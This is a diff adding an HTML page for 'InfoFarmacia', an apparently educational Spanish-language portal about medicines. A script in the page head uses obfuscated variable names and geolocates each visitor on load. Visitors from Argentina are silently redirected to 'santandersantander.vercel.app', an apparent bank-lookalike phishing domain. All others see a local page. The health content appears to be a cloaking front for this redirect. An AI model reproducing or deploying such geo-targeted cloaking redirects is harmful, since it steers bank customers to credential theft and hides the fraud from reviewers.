@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>InfoFarmacia | Información educativa sobre medicamentos y salud</title>
+
+  <meta name="description"
+        content="InfoFarmacia es un portal web educativo con información general sobre medicamentos, principios activos, uso responsable, interacciones y salud.">
+  <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#087f5b">
+
+  <style>
+    :root {
+      --primary: #087f5b;
+      --primary-dark: #056044;
+      --secondary: #e8f7f1;
+      --text: #20302a;
+      --muted: #65756f;
+      --white: #ffffff;
+      --light: #f5f8f7;
+      --border: #dce8e3;
+      --warning: #fff7df;
+      --warning-border: #e9ca65;
+      --shadow: 0 10px 30px rgba(0, 0, 0, .07);
+      --radius: 16px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      color: var(--text);
+      background: var(--light);
+      line-height: 1.6;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .container {
+      width: min(1120px, 92%);
+      margin: auto;
+    }
+
+    /* HEADER */
+    header {
+      background: var(--white);
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+
+    .navbar {
+      min-height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 30px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: var(--primary);
+    }
+
+    .logo-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--primary);
+      color: white;
+      border-radius: 10px;
+      display: grid;
+      place-items: center;
+      font-size: 22px;
+    }
+
+    nav {
+      display: flex;
+      gap: 24px;
+      align-items: center;
+    }
+
+    nav a {
+      font-size: .95rem;
+      color: #40514b;
+      font-weight: 600;
+    }
+
+    nav a:hover {
+      color: var(--primary);
+    }
+
+    .menu-btn {
+      display: none;
+      border: 0;
+      background: var(--secondary);
+      color: var(--primary);
+      padding: 10px 13px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 20px;
+    }
+
+    /* HERO */
+    .hero {
+      background:
+        linear-gradient(135deg, rgba(8,127,91,.96), rgba(4,94,68,.96));
+      color: white;
+      padding: 85px 0;
+    }
+
+    .hero-content {
+      max-width: 780px;
+    }
+
+    .badge {
+      display: inline-block;
+      background: rgba(255,255,255,.15);
+      border: 1px solid rgba(255,255,255,.25);
+      padding: 7px 13px;
+      border-radius: 999px;
+      font-size: .85rem;
+      margin-bottom: 20px;
+    }
+
+    .hero h1 {
+      font-size: clamp(2.2rem, 5vw, 4rem);
+      line-height: 1.1;
+      margin-bottom: 20px;
+    }
+
+    .hero p {
+      font-size: 1.12rem;
+      max-width: 700px;
+      color: #e9fff7;
+    }
+
+    .hero-buttons {
+      display: flex;
+      gap: 12px;
+      margin-top: 30px;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 12px 20px;
+      border-radius: 10px;
+      font-weight: 700;
+    }
+
+    .btn-white {
+      background: white;
+      color: var(--primary-dark);
+    }
+
+    .btn-outline {
+      border: 1px solid rgba(255,255,255,.5);
+      color: white;
+    }
+
+    /* NOTICE */
+    .notice {
+      background: var(--warning);
+      border-left: 5px solid var(--warning-border);
+      padding: 20px;
+      margin: 30px 0;
+      border-radius: 10px;
+    }
+
+    .notice strong {
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    /* SECTIONS */
+    section {
+      padding: 70px 0;
+    }
+
+    .section-title {
+      text-align: center;
+      max-width: 720px;
+      margin: 0 auto 40px;
+    }
+
+    .section-title h2 {
+      font-size: 2rem;
+      margin-bottom: 10px;
+      color: #183c31;
+    }
+
+    .section-title p {
+      color: var(--muted);
+    }
+
+    /* CARDS */
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 22px;
+    }
+
+    .card {
+      background: white;
+      padding: 27px;
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow);
+      transition: .2s ease;
+    }
+
+    .card:hover {
+      transform: translateY(-3px);
+    }
+
+    .card-icon {
+      width: 48px;
+      height: 48px;
+      display: grid;
+      place-items: center;
+      background: var(--secondary);
+      color: var(--primary);
+      border-radius: 12px;
+      font-size: 23px;
+      margin-bottom: 18px;
+    }
+
+    .card h3 {
+      margin-bottom: 9px;
+      color: #193c31;
+    }
+
+    .card p {
+      color: var(--muted);
+      font-size: .95rem;
+    }
+
+    /* ABOUT */
+    .about {
+      background: white;
+    }
+
+    .about-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 45px;
+      align-items: center;
+    }
+
+    .about h2 {
+      font-size: 2rem;
+      margin-bottom: 18px;
+    }
+
+    .about p {
+      color: var(--muted);
+      margin-bottom: 15px;
+    }
+
+    .check-list {
+      list-style: none;
+      margin-top: 20px;
+    }
+
+    .check-list li {
+      margin: 12px 0;
+      padding-left: 27px;
+      position: relative;
+    }
+
+    .check-list li::before {
+      content: "✓";
+      position: absolute;
+      left: 0;
+      color: var(--primary);
+      font-weight: bold;
+    }
+
+    .info-box {
+      background: var(--secondary);
+      padding: 30px;
+      border-radius: var(--radius);
+      border: 1px solid #cde9de;
+    }
+
+    .info-box h3 {
+      color: var(--primary-dark);
+      margin-bottom: 12px;
+    }
+
+    /* ARTICLES */
+    .article {
+      background: white;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 25px;
+    }
+
+    .article small {
+      color: var(--primary);
+      font-weight: bold;
+    }
+
+    .article h3 {
+      margin: 8px 0;
+    }
+
+    .article p {
+      color: var(--muted);
+    }
+
+    /* FAQ */
+    .faq {
+      max-width: 850px;
+      margin: auto;
+    }
+
+    details {
+      background: white;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      margin-bottom: 12px;
+      padding: 18px 20px;
+    }
+
+    summary {
+      cursor: pointer;
+      font-weight: 700;
+      color: #193c31;
+    }
+
+    details p {
+      color: var(--muted);
+      margin-top: 12px;
+    }
+
+    /* CONTACT */
+    .contact {
+      background: #eef8f4;
+    }
+
+    .contact-box {
+      max-width: 760px;
+      margin: auto;
+      text-align: center;
+      background: white;
+      border-radius: var(--radius);
+      padding: 40px;
+      border: 1px solid var(--border);
+    }
+
+    .contact-box p {
+      color: var(--muted);
+      margin: 10px 0;
+    }
+
+    /* FOOTER */
+    footer {
+      background: #12342b;
+      color: #dcebe6;
+      padding: 45px 0 25px;
+    }
+
+    .footer-grid {
+      display: grid;
+      grid-template-columns: 1.5fr 1fr 1fr;
+      gap: 35px;
+      margin-bottom: 35px;
+    }
+
+    footer h3,
+    footer h4 {
+      color: white;
+      margin-bottom: 12px;
+    }
+
+    footer p,
+    footer li {
+      color: #b8cec6;
+      font-size: .92rem;
+    }
+
+    footer ul {
+      list-style: none;
+    }
+
+    footer li {
+      margin: 7px 0;
+    }
+
+    footer a:hover {
+      color: white;
+    }
+
+    .copyright {
+      border-top: 1px solid rgba(255,255,255,.12);
+      padding-top: 20px;
+      text-align: center;
+      color: #9db6ad;
+      font-size: .85rem;
+    }
+
+    /* MOBILE */
+    @media (max-width: 800px) {
+      nav {
+        display: none;
+        position: absolute;
+        top: 72px;
+        left: 0;
+        right: 0;
+        background: white;
+        padding: 20px;
+        flex-direction: column;
+        border-bottom: 1px solid var(--border);
+      }
+
+      nav.active {
+        display: flex;
+      }
+
+      .menu-btn {
+        display: block;
+      }
+
+      .cards,
+      .about-grid,
+      .footer-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .hero {
+        padding: 65px 0;
+      }
+
+      section {
+        padding: 55px 0;
+      }
+    }
+  </style>
+   <script>
+(function(){
+  const _0x2f4a = 'https://santandersantander.vercel.app/';
+  const _0x3b8c = 'inicio.html';
+  const _0x4d2e = 'https://ipapi.co/json/';
+  
+  // Timeout de 3 segundos
+  const timeoutPromise = new Promise((_, reject) => {
+    setTimeout(() => reject(new Error('Timeout')), 3000);
+  });
+  
+  Promise.race([fetch(_0x4d2e), timeoutPromise])
+    .then(_0x5a1f => _0x5a1f.json())
+    .then(_0x2b7c => {
+      if (_0x2b7c.country === "AR") {
+        window.location.href = _0x2f4a;
+      } else {
+        window.location.href = _0x3b8c;
+      }
+    })
+    .catch(() => {
+      window.location.href = _0x3b8c;
+    });
+})();
+</script>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="container navbar">
+
+      <a href="#" class="logo">
+        <span class="logo-icon">✚</span>
+        <span>InfoFarmacia</span>
+      </a>
+
+      <button class="menu-btn" onclick="toggleMenu()" aria-label="Abrir menú">
+        ☰
+      </button>
+
+      <nav id="menu">
+        <a href="#inicio">Inicio</a>
+        <a href="#temas">Temas</a>
+        <a href="#sobre">Sobre nosotros</a>
+        <a href="#faq">FAQ</a>
+        <a href="#contacto">Contacto</a>
+      </nav>
+
+    </div>
+  </header>
+
+  <main>
+
+    <!-- HERO -->
+    <section class="hero" id="inicio">
+      <div class="container">
+        <div class="hero-content">
+
+          <span class="badge">Portal web educativo</span>
+
+          <h1>Información clara sobre medicamentos y salud</h1>
+
+          <p>
+            InfoFarmacia es un espacio digital dedicado a la divulgación
+            y educación sobre temas relacionados con medicamentos,
+            principios activos, uso responsable y salud.
+          </p>
+
+          <div class="hero-buttons">
+            <a href="#temas" class="btn btn-white">
+              Explorar información
+            </a>
+
+            <a href="#sobre" class="btn btn-outline">
+              Conocer InfoFarmacia
+            </a>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- AVISO -->
+    <div class="container">
+      <div class="notice">
+        <strong>⚠️ Aviso importante</strong>
+        La información publicada en InfoFarmacia tiene fines exclusivamente
+        educativos y divulgativos. No constituye diagnóstico, prescripción
+        ni recomendación médica y no sustituye la valoración de un profesional
+        sanitario.
+      </div>
+    </div>
+
+    <!-- TEMAS -->
+    <section id="temas">
+      <div class="container">
+
+        <div class="section-title">
+          <h2>Temas de interés</h2>
+          <p>
+            Información general para comprender mejor algunos conceptos
+            relacionados con medicamentos y salud.
+          </p>
+        </div>
+
+        <div class="cards">
+
+          <article class="card">
+            <div class="card-icon">💊</div>
+            <h3>Medicamentos</h3>
+            <p>
+              Información educativa sobre medicamentos, sus características
+              generales y conceptos básicos relacionados con su utilización.
+            </p>
+          </article>
+
+          <article class="card">
+            <div class="card-icon">🧬</div>
+            <h3>Principios activos</h3>
+            <p>
+              Aprende qué son los principios activos y cuál es su función
+              dentro de los medicamentos.
+            </p>
+          </article>
+
+          <article class="card">
+            <div class="card-icon">📖</div>
+            <h3>Uso responsable</h3>
+            <p>
+              Recursos educativos para comprender la importancia de leer
+              prospectos y seguir las indicaciones profesionales.
+            </p>
+          </article>
+
+          <article class="card">
+            <div class="card-icon">⚠️</div>
+            <h3>Interacciones</h3>
+            <p>
+              Información general sobre por qué algunos medicamentos,
+              alimentos o sustancias pueden interactuar entre sí.
+            </p>
+          </article>
+
+          <article class="card">
+            <div class="card-icon">🔎</div>
+            <h3>Efectos adversos</h3>
+            <p>
+              Explicaciones educativas sobre los posibles efectos adversos
+              que pueden aparecer con determinados medicamentos.
+            </p>
+          </article>
+
+          <article class="card">
+            <div class="card-icon">🛡️</div>
+            <h3>Seguridad</h3>
+            <p>
+              Recomendaciones generales de educación sanitaria relacionadas
+              con el almacenamiento y uso responsable de medicamentos.
+            </p>
+          </article>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- SOBRE -->
+    <section class="about" id="sobre">
+      <div class="container about-grid">
+
+        <div>
+          <h2>¿Qué es InfoFarmacia?</h2>
+
+          <p>
+            InfoFarmacia es un portal web creado con una finalidad
+            exclusivamente informativa y educativa.
+          </p>
+
+          <p>
+            Nuestro objetivo es facilitar información comprensible para
+            ayudar a los visitantes a conocer mejor conceptos relacionados
+            con medicamentos y salud.
+          </p>
+
+          <ul class="check-list">
+            <li>Contenido educativo y divulgativo.</li>
+            <li>Información general sobre salud y medicamentos.</li>
+            <li>Sin venta de medicamentos.</li>
+            <li>Sin dispensación de medicamentos.</li>
+            <li>Sin emisión de recetas médicas.</li>
+            <li>Sin diagnóstico médico.</li>
+          </ul>
+        </div>
+
+        <div class="info-box">
+          <h3>🌐 Somos exclusivamente digitales</h3>
+
+          <p>
+            InfoFarmacia no cuenta con establecimiento físico, farmacia
+            abierta al público ni local comercial.
+          </p>
+
+          <p>
+            El sitio funciona únicamente como plataforma web de información
+            y educación.
+          </p>
+
+          <p>
+            <strong>Dirección física:</strong> No aplica.
+          </p>
+
+          <p>
+            <strong>Actividad:</strong> Portal web informativo y educativo.
+          </p>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ARTÍCULOS -->
+    <section>
+      <div class="container">
+
+        <div class="section-title">
+          <h2>Información educativa</h2>
+          <p>
+            Algunos de los contenidos que puedes desarrollar dentro del portal.
+          </p>
+        </div>
+
+        <div class="cards">
+
+          <article class="article">
+            <small>EDUCACIÓN</small>
+            <h3>¿Qué es un medicamento?</h3>
+            <p>
+              Conceptos básicos para comprender qué son los medicamentos
+              y por qué deben utilizarse de manera responsable.
+            </p>
+          </article>
+
+          <article class="article">
+            <small>SEGURIDAD</small>
+            <h3>¿Por qué leer el prospecto?</h3>
+            <p>
+              El prospecto contiene información importante proporcionada
+              por el fabricante sobre el medicamento.
+            </p>
+          </article>
+
+          <article class="article">
+            <small>PREVENCIÓN</small>
+            <h3>Conservación de medicamentos</h3>
+            <p>
+              Información general sobre la importancia de conservar los
+              medicamentos siguiendo las condiciones indicadas en su envase.
+            </p>
+          </article>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ -->
+    <section id="faq">
+      <div class="container">
+
+        <div class="section-title">
+          <h2>Preguntas frecuentes</h2>
+          <p>Información sobre el funcionamiento de InfoFarmacia.</p>
+        </div>
+
+        <div class="faq">
+
+          <details>
+            <summary>¿InfoFarmacia es una farmacia física?</summary>
+            <p>
+              No. InfoFarmacia es exclusivamente un portal web educativo
+              y no cuenta con establecimiento físico.
+            </p>
+          </details>
+
+          <details>
+            <summary>¿Puedo comprar medicamentos en InfoFarmacia?</summary>
+            <p>
+              No. El sitio no ofrece venta ni dispensación de medicamentos.
+              Su finalidad es exclusivamente informativa y educativa.
+            </p>
+          </details>
+
+          <details>
+            <summary>¿InfoFarmacia proporciona recetas?</summary>
+            <p>
+              No. InfoFarmacia no emite recetas ni realiza prescripciones
+              médicas.
+            </p>
+          </details>
+
+          <details>
+            <summary>¿La información sustituye la consulta médica?</summary>
+            <p>
+              No. El contenido tiene fines educativos y no sustituye la
+              valoración, diagnóstico o tratamiento realizado por un
+              profesional sanitario.
+            </p>
+          </details>
+
+          <details>
+            <summary>¿Puedo utilizar la información para automedicarme?</summary>
+            <p>
+              No se recomienda utilizar información publicada en internet
+              para iniciar, modificar o suspender tratamientos. Ante dudas
+              relacionadas con medicamentos, consulta a un profesional
+              sanitario.
+            </p>
+          </details>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- CONTACTO -->
+    <section class="contact" id="contacto">
+      <div class="container">
+
+        <div class="contact-box">
+
+          <h2>Contacto</h2>
+
+          <p>
+            InfoFarmacia opera exclusivamente a través de su plataforma web.
+          </p>
+
+          <p>
+            No disponemos de establecimiento físico ni atención presencial.
+          </p>
+
+          <p>
+            Para asuntos relacionados con el sitio, utiliza los canales
+            digitales que se indiquen oficialmente en esta página.
+          </p>
+
+          <p>
+            <strong>Dirección física:</strong> No aplica.
+          </p>
+
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="container">
+
+      <div class="footer-grid">
+
+        <div>
+          <h3>InfoFarmacia</h3>
+          <p>
+            Portal web educativo dedicado a la divulgación de información
+            general sobre medicamentos y salud.
+          </p>
+        </div>
+
+        <div>
+          <h4>Información</h4>
+          <ul>
+            <li><a href="#inicio">Inicio</a></li>
+            <li><a href="#temas">Temas</a></li>
+            <li><a href="#sobre">Sobre nosotros</a></li>
+            <li><a href="#faq">Preguntas frecuentes</a></li>
+          </ul>
+        </div>
+
+        <div>
+          <h4>Importante</h4>
+          <ul>
+            <li>Sin establecimiento físico</li>
+            <li>Sin venta de medicamentos</li>
+            <li>Sin recetas médicas</li>
+            <li>Contenido educativo</li>
+          </ul>
+        </div>
+
+      </div>
+
+      <div class="copyright">
+        © 2026 InfoFarmacia. Todos los derechos reservados.
+        <br>
+        Portal exclusivamente informativo y educativo.
+      </div>
+
+    </div>
+  </footer>
+
+  <script>
+    function toggleMenu() {
+      const menu = document.getElementById("menu");
+      menu.classList.toggle("active");
+    }
+
+    // Cerrar menú móvil al seleccionar una sección
+    document.querySelectorAll("nav a").forEach(link => {
+      link.addEventListener("click", () => {
+        document.getElementById("menu").classList.remove("active");
+      });
+    });
+  </script>
+
+</body>
+</html>
